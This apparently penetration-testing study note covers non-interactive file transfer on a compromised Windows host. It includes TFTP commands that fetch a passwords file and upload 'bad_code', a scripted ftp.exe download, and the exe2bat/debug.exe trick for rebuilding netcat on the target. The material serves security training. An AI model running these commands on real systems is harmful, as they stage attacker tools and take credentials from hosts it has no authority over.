# Transferring Files

These exercises cover uses of **non-interactive** mechanisms to transfer files.

## TFTP

```
# Get a file from a remote box
tftp 10.0.0.1 get passwords.txt

# Upload a file to a remote box
tftp 10.0.0.1 put bad_code.txt
```

## FTP

By default `ftp.exe` does not support non-interactive mode.
Therefore, we use a text file of commands to pass to the program to execute.


```
ftp.txt:

open 10.0.0.1 21
USER john
get file.txt
bye
```

Then we execute: `ftp -v -n -s:ftp.txt`.

## VBScript & Powershell

Like FTP, we can use a set of commands to create scripts to do so. For brevity this is left out here.

## debug.exe

Again, this relies upon `echo` commands to create scripts.
We use non-interactive echo commands, to write out the binary file
in its hex value equivalents, and then use `debug.exe` to assemble the written text file
into a binary file.

### Steps

First note, the **64k byte** limit.

Compress using `upx` or other tools if necessary.

Convert the file to a list of echo commands: `wine exe2bat.exe nc.exe nc.txt`.

We can now copy and paste the commands from `nc.txt` into a command prompt, ending with recreating the executable:

```
debug < 123.hex
copy 1.dll nc.exe
```
